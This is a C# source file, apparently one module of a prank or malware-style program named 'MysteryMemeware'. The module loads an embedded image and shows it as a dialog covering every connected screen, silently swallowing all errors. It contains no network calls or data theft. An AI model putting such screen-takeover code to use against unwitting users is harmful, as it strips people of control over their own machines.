namespace MysteryMemeware
{
    public static class ScreenCoverModule
    {
        public const string CoverImageResourceName = "MysteryMemeware.CoverImage.bmp";
        public static void Run()
        {
            try
            {
                System.Reflection.Assembly assembly = typeof(Program).Assembly;
                System.Drawing.Image coverImage = System.Drawing.Image.FromStream(assembly.GetManifestResourceStream(CoverImageResourceName));
                CoverAllScreens(coverImage);
            }
            catch
            {

            }
        }
        public static void CoverAllScreens(System.Drawing.Image screenCoverImage)
        {
            try
            {
                foreach (System.Windows.Forms.Screen screen in System.Windows.Forms.Screen.AllScreens)
                {
                    try
                    {
                        ScreenCoverForm screenCoverForm = new ScreenCoverForm(screen, screenCoverImage);
                        new System.Threading.Thread(() =>
                        {
                            try
                            {
                                screenCoverForm.ShowDialog();
                            }
                            catch
                            {

                            }
                        }).Start();
                    }
                    catch
                    {

                    }
                }
            }
            catch
            {

            }
        }
    }
}